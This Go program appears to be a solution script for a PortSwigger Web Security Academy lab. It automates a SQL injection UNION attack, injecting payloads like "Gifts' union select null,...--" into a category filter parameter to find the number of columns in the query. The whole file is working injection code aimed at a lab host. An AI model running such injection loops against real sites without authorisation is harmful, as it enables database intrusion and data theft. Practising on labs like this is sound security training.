// https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

package main

import (
	"fmt"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0ae3009103b34c12c0b93f3c00e70089.web-security-academy.net/filter"
	numCols, err := numColumns(u, client)
	if err != nil {
		return err
	}

	_, err = fmt.Println(numCols)
	return err
}

func numColumns(u string, client *http.Client) (int, error) {
	for i := 1; i <= 20; i++ {
		nulls := make([]string, i)
		for j := 0; j < len(nulls); j++ {
			nulls[j] = "null"
		}

		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+"--")
		fmt.Println(filterUrl)
		resp, err := client.Get(filterUrl)
		if err != nil {
			return 0, err
		}
		defer resp.Body.Close()
		if resp.StatusCode/100 == 2 {
			return i, nil
		}
	}
	return 0, fmt.Errorf("greater than 20")
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}
